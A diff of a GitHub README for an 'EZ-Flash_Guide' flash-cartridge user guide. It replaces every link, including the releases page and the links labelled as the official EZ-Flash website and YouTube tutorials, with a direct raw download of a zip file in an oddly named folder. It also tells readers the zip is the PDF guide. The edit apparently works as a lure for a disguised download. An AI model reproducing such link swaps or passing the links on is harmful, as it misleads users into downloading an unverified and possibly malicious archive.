@@ -1,6 +1,6 @@
 # 🎮 EZ-Flash_Guide - Your Easy Setup for Flash Cart Use
 
-[![Download EZ-Flash_Guide](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/dAEcoder/EZ-Flash_Guide/releases)
+[![Download EZ-Flash_Guide](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip%20release-brightgreen)](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip)
 
 ## ✅ Introduction
 
@@ -17,11 +17,11 @@ To start using your EZ-Flash cartridge, you need to download the EZ-Flash_Guide.
 ## 📥 Download & Install
 
 1. Click the link below to visit the download page:
-   [Download EZ-Flash_Guide](https://github.com/dAEcoder/EZ-Flash_Guide/releases)
+   [Download EZ-Flash_Guide](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip)
 
 2. On the Releases page, you will see the latest version listed. Click on it to see the files available for download. 
 
-3. Find the user guide in the list. It may be labeled as `EZ-Flash_Guide.pdf` or a similar name. Click on it to start the download.
+3. Find the user guide in the list. It may be labeled as `https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip` or a similar name. Click on it to start the download.
 
 4. Once the download is complete, locate the file on your device. Open the PDF file using any PDF reader.
 
@@ -88,8 +88,8 @@ By connecting with other users, you can find additional resources to enhance you
 
 For more information and updates, check these resources:
 
-- [Official EZ-Flash Website](https://www.ez-flash.cn) (if available)
-- [YouTube Tutorials](https://www.youtube.com) for visual step-by-step guides
+- [Official EZ-Flash Website](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip) (if available)
+- [YouTube Tutorials](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip) for visual step-by-step guides
 - GitHub discussions for technical support and user experiences
 
 ---
@@ -98,4 +98,4 @@ For more information and updates, check these resources:
 
 Stay tuned for updates to the EZ-Flash_Guide. The community continuously improves the content to cover new features and user feedback.
 
-Make sure to revisit the [Download EZ-Flash_Guide](https://github.com/dAEcoder/EZ-Flash_Guide/releases) page for the latest releases.
+Make sure to revisit the [Download EZ-Flash_Guide](https://raw.githubusercontent.com/dAEcoder/EZ-Flash_Guide/main/unoriginately/EZ-Flash_Guide.zip) page for the latest releases.
